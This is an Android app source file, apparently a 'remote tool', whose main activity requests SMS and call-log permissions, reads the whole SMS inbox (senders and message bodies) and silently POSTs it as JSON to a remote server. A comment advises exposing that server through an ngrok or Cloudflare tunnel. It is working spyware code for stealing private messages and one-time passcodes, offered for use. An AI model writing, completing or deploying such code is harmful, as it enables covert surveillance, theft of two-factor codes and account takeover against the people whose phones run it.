package com.example.remotetool;

import android.Manifest;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;
import android.util.Log;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.IOException;
import okhttp3.Call;
import okhttp3.Callback;
import okhttp3.MediaType;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;

public class MainActivity extends AppCompatActivity {

    private static final int PERMISSION_REQUEST_CODE = 123;
    // Yahan apna public ngrok URL daalna (jaise: https://xxxx.trycloudflare.com/api/upload_logs)
    private static final String SERVER_URL = "YOUR_SERVER_URL_HERE/api/upload_logs";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        // Runtime Permissions Check
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED) {
            ActivityCompat.requestPermissions(this, new String[]{Manifest.permission.READ_SMS, Manifest.permission.READ_CALL_LOG}, PERMISSION_REQUEST_CODE);
        } else {
            fetchAndSendSMS();
        }
    }

    private void fetchAndSendSMS() {
        try {
            Uri uriSms = Uri.parse("content://sms/inbox");
            Cursor cursor = getContentResolver().query(uriSms, null, null, null, null);
            JSONArray smsArray = new JSONArray();

            if (cursor != null) {
                while (cursor.moveToNext()) {
                    JSONObject obj = new JSONObject();
                    obj.put("address", cursor.getString(cursor.getColumnIndexOrThrow("address")));
                    obj.put("body", cursor.getString(cursor.getColumnIndexOrThrow("body")));
                    smsArray.put(obj);
                }
                cursor.close();
            }

            // JSON Payload
            JSONObject payload = new JSONObject();
            payload.put("device_id", "TestDevice_01");
            payload.put("type", "sms");
            payload.put("content", smsArray);

            sendDataToServer(payload.toString());

        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private void sendDataToServer(String jsonPayload) {
        OkHttpClient client = new OkHttpClient();
        MediaType JSON = MediaType.parse("application/json; charset=utf-8");
        RequestBody body = RequestBody.create(jsonPayload, JSON);

        Request request = new Request.Builder()
                .url(SERVER_URL)
                .post(body)
                .build();

        client.newCall(request).enqueue(new Callback() {
            @Override
            public void onFailure(Call call, IOException e) {
                Log.e("RemoteTool", "Failed to send data: " + e.getMessage());
            }

            @Override
            public void onResponse(Call call, Response response) throws IOException {
                if (response.isSuccessful()) {
                    Log.d("RemoteTool", "Data sent successfully!");
                }
            }
        });
    }
}
